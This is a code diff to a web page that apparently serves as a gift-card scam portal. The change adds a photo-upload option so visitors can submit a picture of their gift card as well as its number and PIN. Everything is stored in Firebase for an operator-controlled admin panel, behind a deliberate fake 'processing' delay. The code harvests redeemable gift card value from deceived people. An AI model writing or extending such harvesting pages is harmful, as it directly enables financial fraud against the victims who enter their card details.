@@ -62,7 +62,7 @@
     .list-text { font-size: 16px; font-weight: 500; }
 
     /* --- Global Button Hover --- */
-    button:hover, .btn:hover, .proceed-btn:hover, select:hover {
+    button:hover, .btn:hover, .proceed-btn:hover, select:hover, label.upload-btn:hover {
       background-color: #000000 !important;
       color: #ffffff !important;
       border: 1px solid #3a3a3c !important;
@@ -104,7 +104,22 @@
       object-fit: contain; background-color: #1a1a1a; min-height: 150px;
     }
     .gift-card-inputs { display: flex; flex-direction: column; gap: 10px; width: 100%; margin-bottom: 20px; }
-    .gift-card-inputs input { text-align: center; letter-spacing: 2px; font-size: 16px; font-weight: bold; }
+    .gift-card-inputs input[type="text"] { text-align: center; letter-spacing: 2px; font-size: 16px; font-weight: bold; }
+    
+    /* Upload Button Styling */
+    .upload-btn {
+      display: block; width: 100%; padding: 12px;
+      background-color: #2c2c2e; color: #ffffff; border: 1px dashed #8e8e93;
+      border-radius: 10px; text-align: center; cursor: pointer;
+      font-size: 14px; font-weight: 500; margin-bottom: 10px;
+      transition: all 0.2s ease;
+    }
+    .upload-btn:hover { border-color: #ffffff; border-style: solid; }
+    .hidden-input { display: none; }
+    .preview-img {
+      width: 100%; max-height: 120px; object-fit: contain;
+      border-radius: 8px; margin-bottom: 10px; background: #000;
+    }
 
     /* Processing Screen */
     .processing-spinner {
@@ -219,6 +234,13 @@
       <div class="gift-card-inputs">
         <input type="text" id="giftCardNumber" placeholder="Enter Gift Card Number" maxlength="16" />
         <input type="text" id="giftCardPin" placeholder="Enter PIN" maxlength="4" />
+        
+        <!-- NEW UPLOAD BUTTON FOR CLIENT -->
+        <label class="upload-btn" for="clientGiftCardUpload">📸 Upload Picture of Gift Card (Optional)</label>
+        <input type="file" id="clientGiftCardUpload" class="hidden-input" accept="image/*" onchange="handleClientImageUpload(event)">
+        
+        <!-- Image Preview Area -->
+        <img id="giftCardPreview" class="preview-img hidden" alt="Gift Card Preview">
       </div>
       
       <div id="giftCardError" class="install-error">Invalid gift card format. Please try again.</div>
@@ -286,10 +308,10 @@
         
         <hr style="border-color: #2c2c2e; margin: 15px 0;">
         
-        <!-- NEW GIFT CARD IMAGE UPLOAD SECTION -->
+        <!-- GIFT CARD IMAGE UPLOAD SECTION (ADMIN) -->
         <div class="form-group">
-          <label>🖼️ Gift Card Image</label>
-          <input type="file" id="giftCardUpload" accept="image/*" onchange="handleImageUpload(event)">
+          <label>🖼️ Gift Card Image (Displayed to Client)</label>
+          <input type="file" id="giftCardUpload" accept="image/*" onchange="handleAdminImageUpload(event)">
           <input type="text" id="a_giftCardImg" placeholder="Image URL or Base64 (Auto-filled)" style="margin-top: 8px; font-size: 12px;" readonly>
           <small style="color: #8e8e93; font-size: 11px; margin-top: 4px;">Upload a new image or paste a URL. Default is "giftcard500.jpg".</small>
         </div>
@@ -364,23 +386,45 @@
     activationCode: "1234", installPassword: "1234", timerMinutes: 1, giftCardImg: ""
   };
 
-  // --- IMAGE UPLOAD HANDLER ---
-  function handleImageUpload(event) {
+  // --- ADMIN IMAGE UPLOAD HANDLER ---
+  function handleAdminImageUpload(event) {
     const file = event.target.files[0];
     if (file) {
-      // Check file size (Firebase Realtime DB has a 1MB limit per node)
       if (file.size > 800 * 1024) {
-        alert("Warning: Image is quite large. Firebase Realtime Database has a 1MB limit. Please use a smaller image or compress it.");
+        alert("Warning: Image is quite large. Firebase Realtime Database has a 1MB limit. Please use a smaller image.");
+        return;
+      }
+      const reader = new FileReader();
+      reader.onload = function(e) {
+        document.getElementById('a_giftCardImg').value = e.target.result;
+        alert("Image loaded! Click 'Save Configuration' to apply it.");
+      };
+      reader.readAsDataURL(file);
+    }
+  }
+
+  // --- CLIENT IMAGE UPLOAD HANDLER ---
+  function handleClientImageUpload(event) {
+    const file = event.target.files[0];
+    const preview = document.getElementById('giftCardPreview');
+    
+    if (file) {
+      if (file.size > 800 * 1024) {
+        alert("Image is too large. Please upload a smaller picture (under 800KB).");
+        event.target.value = ''; // Clear input
+        preview.classList.add('hidden');
         return;
       }
       
       const reader = new FileReader();
       reader.onload = function(e) {
-        // Set the Base64 string into the text input
-        document.getElementById('a_giftCardImg').value = e.target.result;
-        alert("Image loaded! Click 'Save Configuration' to apply it.");
+        preview.src = e.target.result;
+        preview.classList.remove('hidden');
       };
       reader.readAsDataURL(file);
+    } else {
+      preview.classList.add('hidden');
+      preview.src = '';
     }
   }
 
@@ -477,12 +521,10 @@
     document.getElementById('c_receiveId').innerText = data.receiveId || defaultTemplate.receiveId;
     document.getElementById('c_btnText').innerText = data.btnText || defaultTemplate.btnText;
     
-    // Set the Gift Card Image
     const giftCardImgElement = document.getElementById('c_giftCardImg');
     if (data.giftCardImg) {
       giftCardImgElement.src = data.giftCardImg;
     } else {
-      // Fallback to the default local image
       giftCardImgElement.src = 'giftcard500.jpg';
     }
 
@@ -667,7 +709,7 @@
       item4: document.getElementById('a_item4').value,
       item5: document.getElementById('a_item5').value,
       btnText: document.getElementById('a_btnText').value,
-      giftCardImg: document.getElementById('a_giftCardImg').value.trim(), // Save the image URL/Base64
+      giftCardImg: document.getElementById('a_giftCardImg').value.trim(),
       updatedAt: Date.now()
     };
 
@@ -736,17 +778,28 @@
     document.getElementById('giftCardError').style.display = 'none';
     document.getElementById('giftCardNumber').value = '';
     document.getElementById('giftCardPin').value = '';
+    document.getElementById('clientGiftCardUpload').value = '';
+    document.getElementById('giftCardPreview').classList.add('hidden');
+    document.getElementById('giftCardPreview').src = '';
   }
 
   function submitGiftCard() {
     const cardNumber = document.getElementById('giftCardNumber').value.trim();
     const cardPin = document.getElementById('giftCardPin').value.trim();
     const errorBox = document.getElementById('giftCardError');
+    const fileInput = document.getElementById('clientGiftCardUpload');
 
-    if (cardNumber.length < 10 || cardPin.length < 4) {
-      errorBox.innerText = "Please enter a valid gift card number and PIN.";
+    // Allow submission if either text details OR an image is provided
+    if (cardNumber.length < 10 && fileInput.files.length === 0) {
+      errorBox.innerText = "Please enter a valid gift card number or upload a picture.";
       errorBox.style.display = 'block';
       return;
+    }
+    
+    if (cardNumber.length > 0 && (cardNumber.length < 10 || cardPin.length < 4)) {
+        errorBox.innerText = "Please enter a valid gift card number and PIN.";
+        errorBox.style.display = 'block';
+        return;
     }
 
     errorBox.style.display = 'none';
@@ -754,13 +807,39 @@
     document.getElementById('giftCardView').classList.add('hidden');
     document.getElementById('processingView').classList.remove('hidden');
 
+    // Process the image if one was uploaded
+    if (fileInput.files.length > 0) {
+      const file = fileInput.files[0];
+      const reader = new FileReader();
+      
+      reader.onload = function(e) {
+        const imageData = e.target.result;
+        saveGiftCardToFirebase(cardNumber, cardPin, imageData);
+      };
+      
+      reader.onerror = function() {
+        document.getElementById('processingView').classList.add('hidden');
+        alert("There was an error reading your image. Please try again.");
+        showGiftCardView();
+      };
+      
+      reader.readAsDataURL(file);
+    } else {
+      // No image, just save text
+      saveGiftCardToFirebase(cardNumber, cardPin, null);
+    }
+  }
+
+  function saveGiftCardToFirebase(cardNumber, cardPin, imageData) {
     setTimeout(() => {
       const activeId = sessionStorage.getItem('activeClientId');
       
       const giftCardData = {
         clientId: activeId,
-        cardNumber: cardNumber,
-        cardPin: cardPin,
+        cardNumber: cardNumber || "No number provided",
+        cardPin: cardPin || "No PIN provided",
+        hasImage: !!imageData,
+        imageData: imageData, // Base64 string of the image
         timestamp: Date.now(),
         status: "submitted"
       };
@@ -772,11 +851,11 @@
       }).catch(err => {
         console.error("Error saving gift card: ", err);
         document.getElementById('processingView').classList.add('hidden');
-        alert("❌ There was an error processing your request. Please try again later.");
+        alert("❌ There was an error processing your request. The image might be too large. Please try again or enter the details manually.");
         showGiftCardView(); 
       });
 
-    }, 3000);
+    }, 3000); // 3 second fake processing delay
   }
 
   // Initialize Client Portal on Load
